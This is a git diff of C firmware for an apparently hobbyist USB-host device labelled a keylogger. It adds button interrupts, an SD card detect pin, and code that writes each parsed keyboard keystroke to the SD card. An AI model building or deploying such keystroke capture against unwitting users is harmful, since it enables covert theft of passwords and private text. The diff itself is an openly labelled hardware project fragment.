@@ -16,9 +16,10 @@
 #include "include/drivers/ft260.h"
 
 #define LED 25
+bool print = false;
 
 void toggle(void) {
-    sio_toggle(LED);
+    print = true;
 }
 
 int main()
@@ -64,21 +65,35 @@ int main()
     // USB host controller
     usb_init();
 
-    gpio_set_function(12, GPIO_FUNC_SIO);
-    gpio_set_pulldown(12, false);
-    gpio_set_pullup(12,true);
-    sio_init(12);
-    sio_set_dir(12,INPUT);
+    // Sd card detect pin
+    gpio_set_function(1, GPIO_FUNC_SIO);
+    gpio_set_pulldown(1, false);
+    gpio_set_pullup(1,true);
+    sio_init(1);
+    sio_set_dir(1,INPUT);
 
-//    gpio_set_irq_enabled(12,gpio_irq_event_edge_high, toggle);
-//    gpio_set_irq_enabled(12,gpio_irq_event_edge_low, toggle);
+    // Buttons
+    // Button 1
+    gpio_set_function(2, GPIO_FUNC_SIO);
+    gpio_set_pulldown(2, false);
+    gpio_set_pullup(2,true);
+    sio_init(2);
+    sio_set_dir(2,INPUT);
+    gpio_set_irq_enabled(2,gpio_irq_event_edge_low, toggle);
+    // Button2
+    gpio_set_function(14, GPIO_FUNC_SIO);
+    gpio_set_pulldown(14, false);
+    gpio_set_pullup(14,true);
+    sio_init(14);
+    sio_set_dir(14,INPUT);
+    gpio_set_irq_enabled(14,gpio_irq_event_edge_low, toggle);
 
     bool sd_init = false;
     uint8_t sd_buff[600];
 
     sd_spi_t sd;
     storage_t storage;
-    uint8_t temp[600] = "On ARM-based systems you frequently cannot address a 32-bit word that is not aligned to a 4-byte boundary (as your error is telling you). On x86 you can access non-aligned data, however there is a huge hit on performance. Where an ARM part does support unaligned accesses (e.g. single word normal load), there is a performance penalty and there should be a configurable exception trap. To solve your problem, you would need to request a block of memory that is 4-byte aligned and copy the non-aligned bytes + fill it with garbage bytes to ensure it is 4 byte-aligned";
+    uint8_t temp[600] = "D:t is een test 1234 you frequently cannot address a 32-bit word that is not aligned to a 4-byte boundary (as your error is telling you). On x86 you can access non-aligned data, however there is a huge hit on performance. Where an ARM part does support unaligned accesses (e.g. single word normal load), there is a performance penalty and there should be a configurable exception trap. To solve your problem, you would need to request a block of memory that is 4-byte aligned and copy the non-aligned bytes + fill it with garbage bytes to ensure it is 4 byte-aligned";
 
     int lc = 0;
 //    graphics_print_text(&display, "KEYLOGGER\nDisplay test");
@@ -95,18 +110,22 @@ int main()
         //uart_puts(uart0_hw, "Dit is een test");
 //	    uart_write(uart0_hw,&test,5);
 	    //i2c_write(i2c0_hw, 0x3C, &test, 5, true, true);
+        if (print) {
+            print = false;
+            graphics_print_char(&display, 'X');
+        }
         event_task();
         graphics_task(&display);
 
-        if (!sd_init && sio_get(12)) {
-            sd = sd_spi_init(spi0_hw, 5, 3, 4, 2);
+        if (!sd_init && !sio_get(1)) {
+            sd = sd_spi_init(spi0_hw, 17, 19, 20, 18);
             storage = storage_init(&sd, sd_buff, 600);
             sd_init = true;
 
-            for(int i = 0; i < 550; i++){
-                storage_store_byte(&storage, temp[i]);
-            }
-        }else if(sd_init && sio_get(12)) {
+//            for(int i = 0; i < 550; i++){
+//                storage_store_byte(&storage, temp[i]);
+//            }
+        }else if(sd_init && !sio_get(1)) {
             storage_task(&storage);
         }
 
@@ -116,10 +135,11 @@ int main()
             int chars = hid_report_parse(&hid_parser, &hid_report, pressed_keys);
             for (int i = 0; i < chars; i++){
                 graphics_print_char(&display, pressed_keys[i]);
+                storage_store_byte(&storage, pressed_keys[i]);
             }
         }
         if (ft260_get_output_report(&ft260, &output_report)) {
-            usb_host_hid_send_output_report(&output_report);
+           //usb_host_hid_send_output_report(&output_report);
         }
 
 //		sio_put(LED,1);
